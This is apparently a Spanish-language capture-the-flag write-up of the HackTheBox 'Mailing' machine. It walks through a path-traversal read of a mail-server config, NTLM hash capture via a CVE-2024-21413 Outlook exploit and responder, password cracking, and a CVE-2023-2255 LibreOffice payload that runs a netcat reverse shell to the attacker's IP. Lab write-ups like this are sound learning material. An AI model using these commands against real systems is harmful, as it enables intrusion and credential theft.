---
title: Mailing
layout: default
parent: HackTheBox
---

# Mailing
{:.no_toc}

---

1. List
{:toc}

---
## Reconocimiento

Primero comprobaremos que tenemos conexión con la máquina enviando un solo ping.

```shell
ping -c 1 10.10.11.14
```

Una vez comprobado esto podemos realizar un escaneo de los puertos abiertos que tiene la máquina con mpa.

```shell
nmap -p- -sS 10.10.11.14 --min-rate 5000 -n -Pn -oG allPorts
```

```shell
PORT      STATE SERVICE
25/tcp    open  smtp
80/tcp    open  http
110/tcp   open  pop3
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
143/tcp   open  imap
445/tcp   open  microsoft-ds
465/tcp   open  smtps
587/tcp   open  submission
993/tcp   open  imaps
5040/tcp  open  unknown
5985/tcp  open  wsman
7680/tcp  open  pando-pub
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
57283/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 26.48 seconds
```

Vemos que tiene bastantes servicios activos, por lo que ahora veremos las versiones de estos para recabar más información, en este caso seleccionando los anteriores a 1024.

```shell
nmap -sCV -p25,80,110,135,139,143,445,465,587,993 10.10.11.14 -oN targeted
```

```shell
PORT    STATE SERVICE       VERSION
25/tcp  open  smtp          hMailServer smtpd
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp  open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to http://mailing.htb
110/tcp open  pop3          hMailServer pop3d
|_pop3-capabilities: TOP USER UIDL
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
143/tcp open  imap          hMailServer imapd
|_imap-capabilities: RIGHTS=texkA0001 NAMESPACE QUOTA CHILDREN IMAP4rev1 completed SORT IDLE OK CAPABILITY IMAP4 ACL
445/tcp open  microsoft-ds?
465/tcp open  ssl/smtp      hMailServer smtpd
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
|_ssl-date: TLS randomness does not represent time
587/tcp open  smtp          hMailServer smtpd
| smtp-commands: mailing.htb, SIZE 20480000, STARTTLS, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
|_ssl-date: TLS randomness does not represent time
993/tcp open  ssl/imap      hMailServer imapd
|_imap-capabilities: RIGHTS=texkA0001 NAMESPACE QUOTA CHILDREN IMAP4rev1 completed SORT IDLE OK CAPABILITY IMAP4 ACL
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
|_ssl-date: TLS randomness does not represent time
Service Info: Host: mailing.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-09-18T18:36:44
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
```

Si intentamos acceder a la web de la máquina vemos que intenta resolver a **mailing.htb**, por lo que tendremos que añadirla al archivo de resolución de hosts **/etc/hosts**.

![](/assets/images/Imagenes/Pasted image 20240919104404 1.png)

Vemos una página principal sin nada a primera vista interesante menos unas instrucciones que podemos descargar para conectarnos al servidor vía mail.

![](/assets/images/Imagenes/Pasted image 20240919104611 1.png)

![](/assets/images/Imagenes/Pasted image 20240919104621 1.png)


Podemos comprobar si existen subdominios a los que no seamos capaces de acceder inicialmente.

```shell
ffuf -w /usr/share/wordlists/secLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://mailing.htb -H "Host: FUZZ.mailing.htb" -fs 4681
```

Sin embargo no parece dar ningún resultado, por lo que probaremos con enumeración de directorios ocultos.

```shell
gobuster dir -u http://mailing.htb/instructions -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x html,php,txt
```

Teniendo en cuenta que es posible descargar un archivo a través del fichero php podemos probar si este nos permite movernos de forma recursiva por el servidor y encontrar más archivos, por lo que podemos probar a realizar un path traversal par

```shell
curl 'http://mailing.htb/download.php?file=..\..\windows\system32\drivers\etc\hosts'
```

Y efectivamente, este es vulnerable a LFI.

![](/assets/images/Imagenes/Pasted image 20240920233258.png)
![](/assets/images/Imagenes/Pasted image 20240920234544.png)
Podemos mirar varios directorios como **/windows/system32/drivers/etc/hosts** o **/windows/** o **/boot.ini**. Sin embargo, al tener un servicio de mail podemos mirar si hay alguna posibilidad de mirar su configuración. Si buscamos cuál es la ruta de este vemos que es 
**C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini**, y si hacemos una petición podemos comprobar que existe y podemos acceder. 

![](/assets/images/Imagenes/Pasted image 20240920235457.png)
Vemos que hay dos apartados de contraseñas, y que si las pasamos por la página de hashes.com no mostrará que es **homenetworkingadministrator**.

![](/assets/images/Imagenes/Pasted image 20240920235700.png)
```shell
AdministratorPassword=841bb5acfa6779ae432fd7a4e6600ba7
```

Si probamos a logear con las credenciales de administrador tendremos un error, por lo que podemos probar con los usuarios que se muestran en la página. Sin embargo ninguno de ellos coincide. Esto es quizás porque no sirven para el servicio SMB sino para otro.

```shell
Credenciales no válidas
❯ nxc smb mailing.htb -u administrator -p homenetworkingadministrator
```

Otro de los servicios disponibles es SMTP (587), por lo que podríamos intentar entrar por esa vía. Utilizando la herramienta swaks podemos intentar logearnos.

```shell
swaks -server mailing.htb --auth LOGIN --auth-user administrator@mailing.htb --auth-password homenetworkingadministrator --quit-after AUTH
```


![](/assets/images/Imagenes/Pasted image 20240921001103.png)
Vemos que las credenciales son válidas, pero solo nos permite enviar correos desde esa cuenta, por lo que finalmente deberemos buscar si el programa de mail puede tener alguna vulnerabilidad.

## Explotación

Si buscamos sobre alguna vulnerabilidad de outlook vemos que existe la [CVE-2024-21413](https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability), que permite ejecución remota de comandos (RCE). En ella aprovechamos el script para enviar mediante las credenciales conseguidas a un correo interno, y que al ser pulsado el enlace del correo enviado podamos conseguir claves de acceso.

```shell
python exploit.py --server mailing.htb --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender administrator@mailing.htb --recipient maya@mailing.htb --url "\\10.10.15.32\test" --subject Prueba
```

![](/assets/images/Imagenes/Pasted image 20240921003732.png)
Una vez enviado debemos estar en escucha a cualquier evento con la herramienta **responder** en nuestra tarjeta de red, en este caso al estar conectados por una VPN deberá ser la tarjeta de red virtual.

```shell
responder -I tun0
```

Una vez pasado un tiempo Maya pulsará el mensaje y recogeremos el hash.

```shell
[SMB] NTLMv2-SSP Client   : 10.10.11.14
[SMB] NTLMv2-SSP Username : MAILING\maya
[SMB] NTLMv2-SSP Hash     : maya::MAILING:c44ca3b641036e8f:187EC0A1A686F61EB370E0CFCB6A8FF8:0101000000000000009ACB26C20BDB017C25264FD8AA010800000000020008004F00360032004F0001001E00570049004E002D004F00470049004A005600350035004B004A003900330004003400570049004E002D004F00470049004A005600350035004B004A00390033002E004F00360032004F002E004C004F00430041004C00030014004F00360032004F002E004C004F00430041004C00050014004F00360032004F002E004C004F00430041004C0007000800009ACB26C20BDB01060004000200000008003000300000000000000000000000002000006D57E5BE8534935EAF2984A75FCD0A52E7A783E3DC6B8E126BD0D098019FEC780A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310035002E00330032000000000000000000                                                                        
[*] Skipping previously captured hash for MAILING\maya
[*] Skipping previously captured hash for MAILING\maya
[*] Skipping previously captured hash for MAILING\maya
[*] Skipping previously captured hash for MAILING\maya
[*] Skipping previously captured hash for MAILING\maya
[*] Skipping previously captured hash for MAILING\maya
```

![](/assets/images/Imagenes/Pasted image 20240921011128.png)
Podemos intentar crackear el hash con john the ripper simplemente indicando que queremos usar el diccionario rockyou.txt. Y nos daría la contraseña: **m4y4ngs4ri**

![](/assets/images/Imagenes/Pasted image 20240921011642.png)
Una vez con la contraseña no podemos acceder al contenido compartido y ver que podemos conseguir.

```shell
nxc smb mailing.htb -u maya -p m4y4ngs4ri --shares
SMB         10.10.11.14     445    MAILING          [*] Windows 10 / Server 2019 Build 19041 x64 (name:MAILING) (domain:MAILING) (signing:False) (SMBv1:False)
SMB         10.10.11.14     445    MAILING          [+] MAILING\maya:m4y4ngs4ri 
SMB         10.10.11.14     445    MAILING          [*] Enumerated shares
SMB         10.10.11.14     445    MAILING          Share           Permissions     Remark
SMB         10.10.11.14     445    MAILING          -----           -----------     ------
SMB         10.10.11.14     445    MAILING          ADMIN$                          Admin remota
SMB         10.10.11.14     445    MAILING          C$                              Recurso predeterminado
SMB         10.10.11.14     445    MAILING          Important Documents READ            
SMB         10.10.11.14     445    MAILING          IPC$            READ            IPC remota

```

![](/assets/images/Imagenes/Pasted image 20240921012044.png)
Vemos que hay unos supuestos documentos importantes, pero no podemos descargarlos, y si accedemos con las credenciales de maya vemos que no hay archivos disponibles ni accesibles.

Investigando sobre lo que es capaz de realizar maya con sus privilegios, vemos que es capaz de correr winrm, que es la capacidad de administrar windows de forma remota.
 Si comprobamos veremos que es posible, por lo que podemos entrar con la herramienta evil-winrm.

![](/assets/images/Imagenes/Pasted image 20240921012548.png)
```shell
evil.winrm -i mailing.htb -u maya -p m4y4ngs4ri
```

![](/assets/images/Imagenes/Pasted image 20240921012644.png)
Podemos acceder a la flag de el usuario maya en el directorio de su escritorio.

Si accedemos a la carpeta **"Important Documents"** veremos que no hay nada, además de no poder acceder al directorio wwwroot. Si buscamos en la lista de programas en Program Files, vemos que existe el archivo de configuración **\program\version.ini**, que indica que existe Libreoffice en su versión **7.4.0.1**.

![](/assets/images/Imagenes/Pasted image 20240921014316.png)
## Escalada de privilegios

Si buscamos cualquier vulnerabilidad de esta versión vemos que aparece la [**CVE-2023-2255**](https://github.com/elweth-sec/CVE-2023-2255), que permite lanzar una web shell.

Primero deberemos descargar una versión de netcat para windows que ejecute la máquina víctima, y con nuestra máquina actuar de cliente escuchando por el puerto 1337.

```shell
python3 exploit.py --cmd "cmd.exe /c C:\ProgramData\nc.exe -e cmd.exe 10.10.15.32 1337" --output exploit.odt
```

Una vez creado el payload llamado exploit.odt, podemos acceder a la máquina y subir el archivo en la carpeta donde no encontramos ningún archivo (**C:/Important Documents**), además del ejecutable de netcat a **C:/programdata**.

![](/assets/images/Imagenes/Pasted image 20240921032731.png)
Ahora esperaremos a que el documento sea abierto para conseguir la shell de la máquina, con lo que estaremos dentro con privilegios de administrador y su flag en el escritorio.

![](/assets/images/Imagenes/Pasted image 20240921032310.png)
![](/assets/images/Imagenes/Pasted image 20240921032341.png)